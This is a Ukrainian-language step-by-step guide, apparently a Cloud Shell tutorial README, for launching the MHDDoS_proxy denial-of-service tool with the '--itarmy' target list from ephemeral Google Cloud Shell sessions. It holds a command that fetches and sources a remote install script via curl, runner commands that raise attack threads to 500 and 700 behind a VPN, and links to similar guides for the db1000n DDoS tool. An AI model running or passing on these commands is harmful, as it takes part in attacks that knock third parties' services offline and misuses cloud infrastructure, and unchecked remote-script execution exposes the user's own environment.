#   Все буде Україна! 💙💛

**Привіт друзі!**   

 **☁️ Cloud Shell** зараз працє в ***ефемерному режимі***. Це означає, що все створене під час цього сеансу видалиться разом з віртуальною машиною **після закінчення даного сеансу**.

Якщо з'єднання перервано не підключайтесь повторно бо вийдете з ***ефемерного режиму***, а **завантажте новий сеанс**, натиснувши кнопку розташовану нижче.

[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://console.cloud.google.com/cloudshell/editor?cloudshell=true&shellonly=true&git_repo=https://github.com/patatakartata/Cloud_Shell_DDoS&tutorial=mhddos_proxy_tutorial.md)

## Давайте запустимо MHDDoS_proxy. 
З початку скопіюйте команду розташовану нижче та натисніть клавішу [ENTER] 👇
```bash
cd ~/ && source <(curl https://raw.githubusercontent.com/patatakartata/Cloud_Shell_DDoS/main/mhddos_proxy_install.sh)
```
### Чудово, процес пішов!
Якщо все працює без ***роз'єднань***, можна підвищити потужність. Для цього зупиніть процес натиснувши Ctrl+C, та запустіть команду зі збілшеним навантаженням розташовану нижче 👇
```bash
cd ~/ && cd mhddos_proxy && ./runner.sh python3 -t 500 --itarmy --vpn
```
або ще з більшим навантаженням 👇
```bash
cd ~/ && cd mhddos_proxy && ./runner.sh python3 -t 700 --itarmy --vpn
```
#### Для перевірки навантаження на процесор використаємо команду htop
Для цього додайте ще один термінал натиснувши "**+**" праворуч від заголовка працюючого терміналу, та запустіть наступну команду 👇
```bash
htop
```
##### ***Пропоную для ознайомлення:***
* Натисніть на кнопку щоб завантажити новий сеанс Google Cloud Shell з інструкцією по запуску **«Death by 1000 needles» (db1000n)**.

[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://console.cloud.google.com/cloudshell/editor?cloudshell=true&shellonly=true&git_repo=https://github.com/patatakartata/Cloud_Shell_DDoS&tutorial=tutorial.md)
* Інструкція для початківців 👉 [Як запустити «Death by 1000 needles» (db1000n) в Google Cloud Shell](https://telegra.ph/YAk-zapustiti-dvanadcyat-ekzemplyar%D1%96v-Death-by-1000-needles-db1000n-v-Google-Cloud-Shell-ne-vikoristovuyuchi-VPN-05-04)
* Інструкція для більш досвідчених 👉 [Як запустити потужний Db1000nX100 з використанням VPN в Google Cloud Shell](https://telegra.ph/Zapusk-Db1000nX100-u-Google-Cloud-Shell-05-20)
